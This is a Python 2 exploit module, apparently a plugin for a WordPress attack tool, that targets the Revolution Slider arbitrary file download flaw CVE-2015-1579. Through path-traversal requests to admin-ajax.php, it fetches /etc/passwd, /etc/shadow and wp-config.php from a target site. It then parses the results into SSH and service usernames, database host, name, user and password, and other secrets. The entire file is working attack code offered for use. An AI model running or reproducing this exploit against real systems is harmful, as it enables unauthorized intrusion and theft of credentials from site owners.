from pwn import *
import urllib2
import sys
from datetime import datetime
from Convention import Convention

def description():
	d = "Tries to trigger the Arbitrary File Download Vulnerability CVE-2015-1579 to download /etc/passwd and the config file wp-config.php"
	return d

def passive(target):
    domain = target.url
    log.info('Trying CVE-2015-1579')

    c = Convention()

    dico = ['DB','FTP','KEY','SALT','DOMAIN',]
    users = []
    serviceU = []
    passwords = []

    retValue = []
    shadowFound = False

    p = log.progress('Remote Files')
    p.status('Downloading /etc/passwd')
    etcpasswd = ""
    try:
        etcpasswd = urllib2.urlopen(domain+'wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../../etc/passwd')
    except:
        log.failure('Cannot download /etc/passwd')
    try:
        etcpasswd = etcpasswd.read()
    except:
        log.failure("Can't read /etc/passwd")
    if len(etcpasswd) == 0:
        log.failure('Empty /etc/passwd')
    else:
        log.info('May have /etc/passwd')
        p.status('Parsing Users')
        for line in etcpasswd.split('\n'):
            try:
                if "false" not in line.split(':')[6] and "nologin" not in line.split(':')[6]:
                    u = line.split(':')[0]
                    if u != "sync" and u != "shutdown" and u != "halt" and u != "mysql":
			retValue.append((c.SSH_User,u))
		else:
		    u = line.split(':')[0]
		    retValue.append((c.Service_User,u))
            except:
                pass
        try:
            p.status('Trying /etc/shadow')
            shadow = urllib2.urlopen('http://'+domain+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../../etc/shadow')
            shadow = shadow.read()
            if shadow.replace(" ", ""):
                shadowFound = True
                log.info("May have found the /etc/shadow file")
        except:
            pass

    p.status('Downloading config file')

    wp_configs = ""
    try:
        wp_configs = urllib2.urlopen(domain+'wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
    except:
        log.failure('Cannot download config fIle')
    try:
        wp_configs = wp_configs.read()
    except:
        pass
    if len(wp_configs) == 0:
        log.failure('Empty config file')
    else:
    #print wp_configs
        log.info('May have the config file!')
        p.status('Parsing file')
        wp_configs = wp_configs.split('\n')
        for line in wp_configs:
            for term in dico:
                if term in line and len(line.split("'")) == 5:
                    description = line.split("'")[1]
                    value = line.split("'")[3]
		    if "DB" in description:
			if "DB_USER" in description:
			    retValue.append((c.DB_User,value))
			    retValue.append((c.User,value))
			elif "DB_HOST" in description:
			    retValue.append((c.DB_Host,value))
			elif "DB_PASSWORD" in description:
			    retValue.append((c.DB_Password,value))
			    retValue.append((c.Password,value))
			elif "DB_NAME" in description:
			    retValue.append((c.DB_Name,value))
                    elif "USER" in description: 
                        retValue.append((c.User,value))
                    elif "PASS" in description and value not in passwords:
                        if value.replace(" ", ""):
                            passwords.append(value)
		    else:
			retValue.append((description,value))
                    break
    if len(retValue) == 0:
        retValue = [("none",False)]
    return retValue

def active(target):
	return passive(target)
